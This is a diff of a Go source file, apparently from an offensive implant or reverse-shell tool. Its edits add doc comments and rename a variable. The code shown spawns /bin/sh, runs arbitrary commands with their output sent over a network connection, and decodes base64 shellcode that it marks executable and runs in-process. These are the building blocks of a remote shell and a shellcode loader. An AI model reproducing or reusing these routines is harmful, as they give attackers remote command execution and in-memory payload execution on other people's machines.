@@ -10,20 +10,23 @@ import (
 	"unsafe"
 )
 
+// GetShell returns an *exec.Cmd instance which will run /bin/sh
 func GetShell() *exec.Cmd {
 	cmd := exec.Command("/bin/sh")
 	return cmd
 }
 
+// ExecuteCmd runs the provided command through /bin/sh
+// and redirects the result to the provided net.Conn object.
 func ExecuteCmd(command string, conn net.Conn) {
-	cmd_path := "/bin/sh"
-	cmd := exec.Command(cmd_path, "-c", command)
+	cmdPath := "/bin/sh"
+	cmd := exec.Command(cmdPath, "-c", command)
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	cmd.Run()
 }
 
-// Decodes base64 encoded shellcode
+// InjectShellcode decodes base64 encoded shellcode
 // and injects it in the same process.
 func InjectShellcode(encShellcode string) {
 	if encShellcode != "" {
@@ -40,7 +43,7 @@ func getPage(p uintptr) []byte {
 	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
 }
 
-// Set the memory page containing the shellcode
+// ExecShellcode sets the memory page containing the shellcode
 // to R-X, then executes the shellcode as a function.
 func ExecShellcode(shellcode []byte) {
 	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
